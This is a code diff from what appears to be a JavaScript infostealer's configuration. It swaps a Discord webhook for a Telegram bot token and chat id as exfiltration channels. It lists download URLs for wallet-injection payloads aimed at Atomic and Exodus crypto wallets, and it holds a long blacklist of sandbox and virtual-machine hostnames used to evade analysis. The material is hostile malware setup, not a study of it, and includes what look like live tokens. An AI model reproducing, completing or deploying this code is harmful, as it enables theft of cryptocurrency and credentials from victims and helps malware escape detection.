@@ -26,9 +26,9 @@ const atomicInjectionUrl = "https://github.com/doenerium6969/wallet-injection/ra
 const exodusInjectionUrl = "https://faint.sh/app.asar";
 
 const url = 'BINDER-LINK-HERE';
-const botToken = 'YOURBOTTOKEN';
-const chatId = 'YOURCHATID';
-const discordWebhookUrl = 'https://discord.com/api/webhooks/1289336168084672663/XqlYmtPft25eoboRU3vhWTewCcH52YuJfNADyzLOCFr4trWcRFUM5Xr1OiAVnS4r7go1';
+const botToken = '7599728775:AAGX1GIt43HGxJS6sjcR3MzdPK0IyRCvxPA';
+const chatId = '1729115099';
+const discordWebhookUrl = '';
 
 
 const blackListedHostname = ["BEE7370C-8C0C-4", "AppOnFly-VPS","tVaUeNrRraoKwa", "vboxuser", "fv-az269-80", "DESKTOP-Z7LUJHJ", "DESKTOP-0HHYPKQ", "DESKTOP-TUAHF5I",  "DESKTOP-NAKFFMT", "WIN-5E07COS9ALR", "B30F0242-1C6A-4", "DESKTOP-VRSQLAG", "Q9IATRKPRH", "XC64ZB", "DESKTOP-D019GDM", "DESKTOP-WI8CLET", "SERVER1", "LISA-PC", "JOHN-PC", "DESKTOP-B0T93D6", "DESKTOP-1PYKP29", "DESKTOP-1Y2433R", "WILEYPC", "WORK", "6C4E733F-C2D9-4", "RALPHS-PC", "DESKTOP-WG3MYJS", "DESKTOP-7XC6GEZ", "DESKTOP-5OV9S0O", "QarZhrdBpj", "ORELEEPC", "ARCHIBALDPC", "JULIA-PC", "d1bnJkfVlH", ]
